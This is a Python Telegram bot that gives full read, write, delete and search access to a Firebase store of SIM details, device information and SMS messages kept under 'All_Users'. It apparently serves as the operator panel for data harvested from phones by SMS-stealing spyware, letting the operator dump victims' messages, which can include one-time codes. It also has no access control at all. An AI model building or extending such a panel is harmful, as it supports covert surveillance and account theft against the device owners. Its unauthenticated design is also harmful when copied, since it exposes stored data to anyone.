import telebot
import os
import random
from dotenv import load_dotenv
from firebase import read_data, write_data, update_data, delete_data

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(TOKEN)

# Dictionary to store user sessions
user_sessions = {}

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(
        message,
        "🤖 Firebase Bot V2\n\n"
        "📱 **Main Commands:**\n"
        "/sim - SIM Details\n"
        "/info - Device Info\n"
        "/sms - SMS Data\n"
        "/device DEVICE_ID - Device Info\n"
        "/users - List all users\n"
        "/stats - Database statistics\n\n"
        "📝 **Data Management:**\n"
        "/add - Add new data\n"
        "/update - Update existing data\n"
        "/delete - Delete data\n\n"
        "🔍 **Search:**\n"
        "/search KEYWORD - Search in database"
    )

@bot.message_handler(commands=["sim"])
def sim(message):
    data = read_data("All_Users/simDetails")
    
    if not data:
        bot.reply_to(message, "❌ No SIM data found")
        return
    
    # Format SIM data nicely
    response = "📱 **SIM Details:**\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            response += f"**{key}:**\n"
            for k, v in value.items():
                response += f"  • {k}: {v}\n"
        else:
            response += f"**{key}:** {value}\n"
        response += "\n"
    
    bot.reply_to(message, response[:4000])

@bot.message_handler(commands=["info"])
def info(message):
    data = read_data("All_Users/Data/DeviceInfo")
    
    if not data:
        bot.reply_to(message, "❌ No device info found")
        return
    
    # Format device info
    response = "📱 **Device Info:**\n\n"
    for device_id, info in data.items():
        response += f"**Device ID:** {device_id}\n"
        if isinstance(info, dict):
            for k, v in info.items():
                response += f"  • {k}: {v}\n"
        else:
            response += f"  • Info: {info}\n"
        response += "\n"
    
    bot.reply_to(message, response[:4000])

@bot.message_handler(commands=["sms"])
def sms(message):
    data = read_data("All_Users/sms")
    
    if not data:
        bot.reply_to(message, "❌ No SMS found")
        return
    
    # Format SMS data
    response = "📨 **SMS Data:**\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            response += f"**{key}:**\n"
            for k, v in value.items():
                response += f"  • {k}: {v}\n"
        else:
            response += f"**{key}:** {value}\n"
        response += "\n"
    
    bot.reply_to(message, response[:4000])

@bot.message_handler(commands=["device"])
def device(message):
    args = message.text.split()
    
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage:\n/device DEVICE_ID\n\nExample: /device device_123")
        return
    
    device_id = args[1]
    data = read_data(f"All_Users/Data/DeviceInfo/{device_id}")
    
    if not data:
        bot.reply_to(message, f"❌ Device '{device_id}' not found")
        return
    
    response = f"📱 **Device Info - {device_id}:**\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            response += f"**{key}:**\n"
            for k, v in value.items():
                response += f"  • {k}: {v}\n"
        else:
            response += f"**{key}:** {value}\n"
        response += "\n"
    
    bot.reply_to(message, response[:4000])

@bot.message_handler(commands=["users"])
def users(message):
    data = read_data("All_Users")
    
    if not data:
        bot.reply_to(message, "❌ No users found")
        return
    
    user_list = []
    for key in data.keys():
        if key not in ["Data", "simDetails", "sms"]:
            user_list.append(key)
    
    if not user_list:
        bot.reply_to(message, "❌ No user data found")
        return
    
    response = "👥 **User List:**\n\n"
    for i, user in enumerate(user_list, 1):
        response += f"{i}. {user}\n"
    
    bot.reply_to(message, response[:4000])

@bot.message_handler(commands=["stats"])
def stats(message):
    data = read_data("All_Users")
    
    if not data:
        bot.reply_to(message, "❌ No data found")
        return
    
    total_devices = 0
    total_sms = 0
    total_users = len([k for k in data.keys() if k not in ["Data", "simDetails", "sms"]])
    
    # Count devices
    device_data = read_data("All_Users/Data/DeviceInfo")
    if device_data:
        total_devices = len(device_data)
    
    # Count SMS
    sms_data = read_data("All_Users/sms")
    if sms_data:
        total_sms = len(sms_data)
    
    response = "📊 **Database Statistics:**\n\n"
    response += f"👥 Total Users: {total_users}\n"
    response += f"📱 Total Devices: {total_devices}\n"
    response += f"📨 Total SMS: {total_sms}\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["add"])
def add(message):
    args = message.text.split(maxsplit=2)
    
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage:\n/add PATH VALUE\n\nExample: /add All_Users/Data/DeviceInfo/new_device {\"model\":\"iPhone\",\"version\":\"14\"}")
        return
    
    path = args[1]
    value = args[2]
    
    try:
        # Try to parse as JSON
        import json
        if value.startswith('{'):
            value = json.loads(value)
    except:
        pass
    
    success = write_data(path, value)
    
    if success:
        bot.reply_to(message, f"✅ Data added successfully at:\n`{path}`")
    else:
        bot.reply_to(message, "❌ Failed to add data")

@bot.message_handler(commands=["update"])
def update(message):
    args = message.text.split(maxsplit=2)
    
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage:\n/update PATH VALUE\n\nExample: /update All_Users/Data/DeviceInfo/device_123/model \"iPhone 15\"")
        return
    
    path = args[1]
    value = args[2]
    
    try:
        import json
        if value.startswith('{'):
            value = json.loads(value)
    except:
        pass
    
    success = update_data(path, value)
    
    if success:
        bot.reply_to(message, f"✅ Data updated successfully at:\n`{path}`")
    else:
        bot.reply_to(message, "❌ Failed to update data")

@bot.message_handler(commands=["delete"])
def delete(message):
    args = message.text.split()
    
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage:\n/delete PATH\n\nExample: /delete All_Users/Data/DeviceInfo/device_123")
        return
    
    path = args[1]
    success = delete_data(path)
    
    if success:
        bot.reply_to(message, f"✅ Data deleted successfully from:\n`{path}`")
    else:
        bot.reply_to(message, "❌ Failed to delete data")

@bot.message_handler(commands=["search"])
def search(message):
    args = message.text.split()
    
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage:\n/search KEYWORD\n\nExample: /search iPhone")
        return
    
    keyword = args[1].lower()
    data = read_data("All_Users")
    
    if not data:
        bot.reply_to(message, "❌ No data found")
        return
    
    results = []
    
    def search_recursive(obj, path=""):
        if isinstance(obj, dict):
            for key, value in obj.items():
                new_path = f"{path}/{key}" if path else key
                if keyword in key.lower():
                    results.append(f"📌 `{new_path}`")
                search_recursive(value, new_path)
        elif isinstance(obj, list):
            for i, value in enumerate(obj):
                new_path = f"{path}[{i}]"
                search_recursive(value, new_path)
        else:
            if isinstance(obj, str) and keyword in obj.lower():
                results.append(f"📌 `{path}` = {obj[:50]}")
            elif isinstance(obj, (int, float)) and keyword in str(obj):
                results.append(f"📌 `{path}` = {obj}")
    
    search_recursive(data)
    
    if not results:
        bot.reply_to(message, f"❌ No results found for '{keyword}'")
        return
    
    response = f"🔍 **Search Results for '{keyword}':**\n\n"
    for result in results[:20]:  # Limit to 20 results
        response += f"{result}\n"
    
    if len(results) > 20:
        response += f"\n... and {len(results) - 20} more results"
    
    bot.reply_to(message, response[:4000])

# Error handler
@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.reply_to(
        message,
        "❌ Unknown command\n\n"
        "Use /start to see available commands"
    )

print("🤖 Bot V2 Started Successfully...")
try:
    bot.infinity_polling()
except Exception as e:
    print(f"Error: {e}")
